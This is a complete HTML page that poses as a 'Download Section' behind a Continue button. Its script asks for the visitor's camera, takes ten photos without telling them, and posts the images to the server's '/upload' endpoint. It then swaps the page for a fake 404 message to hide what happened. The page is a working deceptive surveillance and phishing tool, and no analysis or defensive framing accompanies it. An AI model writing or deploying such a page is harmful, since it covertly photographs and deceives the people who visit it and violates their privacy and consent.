<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Camera Page</title>
<style>
  body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #121212;
    color: #fff;
    text-align: center;
    display: flex;
    flex-direction: column;
    justify-content: center;
    height: 100vh;
    margin: 0;
  }
  h1 {
    font-size: 42px;
    margin-bottom: 10px;
  }
  h2 {
    font-size: 24px;
    margin-bottom: 40px;
    color: #00d4ff;
  }
  button {
    padding: 15px 30px;
    font-size: 18px;
    background: linear-gradient(90deg, #00ff6a, #00d4ff);
    border: none;
    border-radius: 10px;
    color: #121212;
    cursor: pointer;
    transition: 0.3s;
  }
  button:hover {
    transform: scale(1.1);
    box-shadow: 0 0 20px #00ff6a;
  }
</style>
</head>
<body>
<h1>Download Section</h1>
<h2>Press Continue to access the download section</h2>
<button id="startBtn">Continue</button>

<script>
document.getElementById('startBtn').addEventListener('click', async () => {
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  const video = document.createElement('video');
  video.srcObject = stream;
  await video.play();

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 320;
  canvas.height = video.videoHeight || 240;
  const ctx = canvas.getContext('2d');

  // Take 10 photos and send to server
  for (let i = 1; i <= 10; i++) {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imgData = canvas.toDataURL('image/png');
    await fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ photo: imgData, index: i })
    });
  }

  // Stop camera
  stream.getTracks().forEach(track => track.stop());

  // Redirect to fake 404 page with custom message
  document.body.innerHTML = `
    <h1 style="color:#00ff6a; font-size: 48px;">404</h1>
    <h2 style="color:#00ff6a;">Page Not Found</h2>
    <p style="position:absolute; bottom:20px; width:100%; text-align:center; color:#00ff6a;">
      The website is currently unavailable
    </p>
  `;
});
</script>
</body>
</html>
